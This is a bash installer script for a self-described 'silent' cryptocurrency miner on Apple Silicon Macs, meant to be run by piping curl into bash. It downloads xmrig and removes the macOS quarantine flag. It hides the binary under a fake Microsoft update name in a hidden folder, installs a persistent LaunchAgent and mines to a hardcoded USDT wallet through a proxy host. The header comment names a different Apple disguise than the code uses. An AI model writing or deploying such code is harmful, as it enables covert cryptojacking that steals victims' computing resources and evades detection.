#!/usr/bin/env bash
# ============================================================
# mine_usdt.sh — Silent miner, paid in USDT-TRC20 via unMineable
# macOS Apple Silicon M1/M2/M3/M4 — xmrig pre-built ARM64
# Process appears as: "com.apple.securityd.network"
# Run: curl -fsSL https://raw.githubusercontent.com/sajalsoumalya/vps/main/mine_usdt.sh | bash
# ============================================================

USDT_WALLET="TFgAiyPGmqDUo9RZa1faaCgDcmaumh2Jgc"
COIN="USDT"
NETWORK="TRC20"
WORKER="m2mac"
# unMineable referral code gives reduced 0.75% fee (default is 1%)
REF_CODE="jaso-xmr"
POOL_HOST="cdn.soumalya.in"  # VPS proxy port 3956 → rx.unmineable.com:3333
POOL_PORT="3956"
XMRIG_VERSION="6.26.0"
XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-macos-arm64.tar.gz"

DISGUISE_NAME="com.microsoft.update.agent"
INSTALL_DIR="$HOME/Library/Application Support/.msupd"
BINARY_PATH="$INSTALL_DIR/$DISGUISE_NAME"
PLIST_PATH="$HOME/Library/LaunchAgents/${DISGUISE_NAME}.plist"
LOG_PATH="$HOME/Library/Logs/${DISGUISE_NAME}.log"
CONFIG_PATH="$INSTALL_DIR/config.json"

if [[ "$(uname)" != "Darwin" || "$(uname -m)" != "arm64" ]]; then
  echo "[!] Requires macOS Apple Silicon (M1/M2/M3/M4)."
  exit 1
fi

MAX_THREADS=$(sysctl -n hw.logicalcpu)
THREADS=$MAX_THREADS

# ---- Thread prompt ----
if [[ -c /dev/tty ]]; then
  echo ""
  echo "╔══════════════════════════════════════════╗"
  printf "║  USDT MINER via unMineable — %s cores  ║\n" "$MAX_THREADS"
  echo "╚══════════════════════════════════════════╝"
  echo -n "  Cores to use [1-$MAX_THREADS, Enter=ALL]: " > /dev/tty
  read -r USER_THREADS < /dev/tty || USER_THREADS=""
  echo ""
  if [[ "$USER_THREADS" =~ ^[0-9]+$ ]] && [[ "$USER_THREADS" -ge 1 ]] && [[ "$USER_THREADS" -le "$MAX_THREADS" ]]; then
    THREADS=$USER_THREADS
  fi
  echo "  → Mining with $THREADS / $MAX_THREADS cores"
  echo "  → Paid in: USDT-TRC20"
  echo "  → Wallet : ${USDT_WALLET:0:10}...${USDT_WALLET: -6}"
  echo ""
fi

echo "[*] Apple Silicon M-series — $THREADS cores"

# ---- Stop + wipe old install ----
echo "[1/5] Wiping old install..."
launchctl unload "$PLIST_PATH" 2>/dev/null || true
pkill -9 -f "$DISGUISE_NAME" 2>/dev/null || true
pkill -9 -f "xmrig" 2>/dev/null || true
sleep 1
rm -rf "$INSTALL_DIR"
rm -f "$PLIST_PATH" "$LOG_PATH"
mkdir -p "$INSTALL_DIR" "$HOME/Library/LaunchAgents" "$HOME/Library/Logs"
echo "      ✓ Clean"

# ---- Download xmrig ----
echo "[2/5] Downloading xmrig v${XMRIG_VERSION} ARM64..."
TMP_TAR="/tmp/xmrig_usdt.tar.gz"
curl -fsSL "$XMRIG_URL" -o "$TMP_TAR"
tar -xzf "$TMP_TAR" -C "$INSTALL_DIR" --strip-components=1
rm -f "$TMP_TAR"
mv "$INSTALL_DIR/xmrig" "$BINARY_PATH"
chmod +x "$BINARY_PATH"
xattr -d com.apple.quarantine "$BINARY_PATH" 2>/dev/null || true
echo "      ✓ Binary ready"

# ---- Write config ----
echo "[3/5] Writing config..."
# unMineable wallet format: COIN:ADDRESS.WORKER#REFCODE
POOL_USER="${COIN}:${USDT_WALLET}.${WORKER}#${REF_CODE}"

cat > "$CONFIG_PATH" << CONF
{
  "autosave": false,
  "background": false,
  "colors": false,
  "randomx": {
    "mode": "light",
    "1gb-pages": false,
    "numa": false,
    "wrmsr": false,
    "rdmsr": false
  },
  "cpu": {
    "enabled": true,
    "huge-pages": false,
    "huge-pages-jit": false,
    "hw-aes": true,
    "priority": 5,
    "memory-pool": false,
    "asm": true,
    "max-threads-hint": 100
  },
  "pools": [
    {
      "url": "${POOL_HOST}:${POOL_PORT}",
      "user": "${POOL_USER}",
      "pass": "x",
      "keepalive": true,
      "nicehash": false
    }
  ],
  "threads": $THREADS,
  "log-file": "${LOG_PATH}"
}
CONF
echo "      ✓ Config: ${COIN}:${USDT_WALLET:0:10}... → unMineable"

# ---- Write LaunchAgent ----
echo "[4/5] Installing LaunchAgent..."
printf '<?xml version="1.0" encoding="UTF-8"?>\n' > "$PLIST_PATH"
printf '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n' >> "$PLIST_PATH"
printf '<plist version="1.0"><dict>\n' >> "$PLIST_PATH"
printf '  <key>Label</key><string>%s</string>\n' "$DISGUISE_NAME" >> "$PLIST_PATH"
printf '  <key>ProgramArguments</key><array>\n' >> "$PLIST_PATH"
printf '    <string>%s</string>\n' "$BINARY_PATH" >> "$PLIST_PATH"
printf '    <string>--config</string>\n' >> "$PLIST_PATH"
printf '    <string>%s</string>\n' "$CONFIG_PATH" >> "$PLIST_PATH"
printf '  </array>\n' >> "$PLIST_PATH"
printf '  <key>RunAtLoad</key><true/>\n' >> "$PLIST_PATH"
printf '  <key>KeepAlive</key><true/>\n' >> "$PLIST_PATH"
printf '  <key>StandardOutPath</key><string>%s</string>\n' "$LOG_PATH" >> "$PLIST_PATH"
printf '  <key>StandardErrorPath</key><string>%s</string>\n' "$LOG_PATH" >> "$PLIST_PATH"
printf '</dict></plist>\n' >> "$PLIST_PATH"
echo "      ✓ Auto-starts on login"

# ---- Launch ----
echo "[5/5] Starting..."
launchctl load -w "$PLIST_PATH"
sleep 3

echo ""
echo "╔══════════════════════════════════════════╗"
echo "║         USDT MINER — RUNNING             ║"
echo "╠══════════════════════════════════════════╣"
printf "║  Process : %-30s ║\n" "$DISGUISE_NAME"
printf "║  Payout  : USDT-TRC20                   ║\n"
printf "║  Wallet  : %s...%s  ║\n" "${USDT_WALLET:0:10}" "${USDT_WALLET: -6}"
printf "║  Pool    : %-30s ║\n" "$POOL_HOST:$POOL_PORT"
printf "║  Threads : %s / %s cores                  ║\n" "$THREADS" "$MAX_THREADS"
printf "║  Min Pay : 1 USDT (~1-2 days)           ║\n"
echo "╚══════════════════════════════════════════╝"
echo ""
echo "  Live logs : tail -f \"$LOG_PATH\""
echo "  Balance   : https://unmineable.com/coins/USDT/address/$USDT_WALLET"
echo "  Stop      : launchctl unload \"$PLIST_PATH\""
echo ""
sleep 4
tail -25 "$LOG_PATH" 2>/dev/null || echo "[*] Log starting up..."
